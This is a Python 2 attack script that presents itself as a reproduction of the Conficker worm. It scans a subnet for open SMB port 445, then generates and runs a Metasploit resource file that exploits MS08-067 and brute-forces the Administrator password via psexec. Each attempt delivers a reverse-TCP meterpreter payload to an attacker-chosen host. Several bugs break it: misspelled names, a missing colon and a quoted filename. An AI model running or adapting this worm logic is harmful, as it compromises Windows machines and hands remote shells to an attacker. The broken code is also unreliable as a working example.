#This script is a reproduction of the Conficker Worm.
#Metasploit modules are used for the exploit and handling connnections

import os
import optparse
import nmap

def findtgts(subNet):
	'Scans for open 445 ports on subnet'

	nmScan = nmap.Scanner()
	nmScan.scan(subNet, '445')
	tgtHosts = []

	for host in nmScan.all_hosts():
		if nmScan[host].has_tcp(445):
			
			state = nmScan[host]['tcp'][445]['state']
			if state == 'open':

				print '[+] Found Target Host: ' + host
				tgtHosts.append(host)
	return tgtHosts

def setupHandler(configFile, lhost, lport):
	'setup a reverse tcp handler  waiting for meterpreter connection requests'

	configFile.write('use exploit/multi/handler\n')
	configFile.write('set payload windows/meterpreter/reverse_tcp\n')
	configFile.write('set LHOST ' + lhost + '\n')
	configFile.write('set LPORT ' + str(lport) + '\n')
	configFile.write('exploit -j -z\n')
	configFile.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile, tgtHost, lhost, lport):
	'attempt to exploit targets with open 445 port who are vulnerable to ms08_067_netapi'

	configFile.write('use exploit/windows/smb/ms08_067_netapi')
	configFile.write('set payload windows/meterpreter/reverse_tcp\n')
	configFile.write('set RHOST ' + tgtHost + '\n')
	configFile.write('set LHOST ' + lhost + '\n')
	configFile.write('set LPORT ' + str(lport) + '\n')
	configFile.write('exploit -j -z\n')

def smbBrute(configFIle, tgtHost, passwdFile, lhost, lport):
	'Bruteforce SMB use using msf module'

	username = 'Administrator'
	pF = open('passwdFile', 'r')

	for password  in pF.readlines():

		password = password.strip('\n').strip('\r')
		configFile.write('use exploit/windows/smb/psexec')
		configFile.write('set payload windows/meterpreter/reverse_tcp\n')
		configFile.write('set SMBuser ' + str(username) + '\n')
		configFile.write('set SMBPass ' + str(password) + '\n')
		configFile.write('set RHOST ' + tgtHost + '\n')
		configFile.write('set LHOST ' + lhost + '\n')
		configFile.write('set LPORT ' + str(lport) + '\n')
		configFile.write('exploit -j -z\n')


def main():

	configFile = open('meta.rc', 'w')
	
	parser = optparse.OptionParser('usage%prog ' +\
			 '-H <RHOST[s]> -l <LHOST> -p <LPORT> -F <password list>')
	parser.add_option('-H', dest='tgtHosts', type='string', help='specify target hosts')
	parser.add_option('-l', dest='lhost', type='string', help='specify the listen address')
	parser.add_option('-p', dest='lport', type='string', help='specify the listen port')
	parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')

	(options, args) = parser.parse_args()

	tgtHosts = options.tgtHosts
	lhost 	= options.lhost
	lport 	= options.lport
	passwdFile = options.passwdFile

	if (tgtHost == None) or (lhost == None):
		print parser.usage
		exit(0)

	if lport == None:
		lport = '1337'

	tgtHosts = findtgs(tgtHosts)
	setupHandler(configFile, lhost, lport)

	for tgtHost in tgtHosts

		confickerExploit(configFile, tgtHost, lhost, lport)
		
		if passwdFile != None:
			smbBrute(configFile, tgtHost, passwdFile, lhost, lport)

	configFile.close()
	os.system('msfconsole -r meta.rc')

if __name__ == '__main__':
	main()